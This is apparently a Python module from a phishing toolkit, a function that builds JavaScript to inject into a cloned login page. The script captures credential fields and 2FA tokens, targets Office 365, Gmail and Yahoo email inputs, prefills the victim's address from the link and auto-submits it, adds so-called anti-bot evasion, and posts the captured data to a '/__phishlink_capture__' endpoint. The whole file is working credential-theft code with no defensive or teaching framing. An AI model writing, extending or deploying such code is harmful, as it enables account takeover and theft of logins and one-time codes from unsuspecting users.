import logging

def generate_injection_script(config):
    try:
        selectors = [
            f"{rule['field']}: document.querySelector('{rule['selector']}')?.value"
            for rule in config['capture_rules']['credentials']
        ]
        if '2fa_token' in config['capture_rules']:
            selectors.append(f"2fa_token: document.querySelector('{config['capture_rules']['2fa_token']}')?.value")

        # Service-specific email input selector
        email_selector = {
            'office365': 'input[name="loginfmt"]',
            'gmail': 'input[name="identifier"]',
            'yahoo': 'input[name="username"]'
        }.get(config['service_name'], 'input[type="email"]')

        # Prefill and auto-submit script
        prefill_script = ""
        if config['link_format']['prefill_email']:
            prefill_script = f"""
            const email = window.location.hash.slice(1);
            if (email) {{
                const emailInput = document.querySelector('{email_selector}');
                if (emailInput) {{
                    emailInput.value = email;
                    emailInput.dispatchEvent(new Event('input', {{ bubbles: true }}));
                    emailInput.dispatchEvent(new Event('change', {{ bubbles: true }}));
                    setTimeout(() => {{
                        const submitButton = document.querySelector('input[type="submit"]') || document.querySelector('button[type="submit"]') || document.querySelector('div[role="button"][data-id="sign-in"]');
                        if (submitButton) {{
                            submitButton.click();
                        }}
                    }}, 500);
                }}
            }}
            """

        # Anti-bot evasion and capture
        script = f"""
        <script>
            function simulateHumanInput() {{
                const inputs = document.querySelectorAll('input');
                inputs.forEach(input => {{
                    input.addEventListener('input', () => {{
                        setTimeout(() => {{
                            input.dispatchEvent(new Event('change'));
                        }}, Math.random() * 100 + 50);
                    }});
                }});
            }}
            window.addEventListener('load', () => {{
                simulateHumanInput();
                {prefill_script}
            }});
            window.addEventListener('submit', function(e) {{
                let data = {{
                    {', '.join(selectors)}
                }};
                fetch('/__phishlink_capture__', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(data)
                }});
            }});
        </script>
        """
        return script
    except Exception as e:
        logging.error(f"Injection script error: {e}")
        return ""
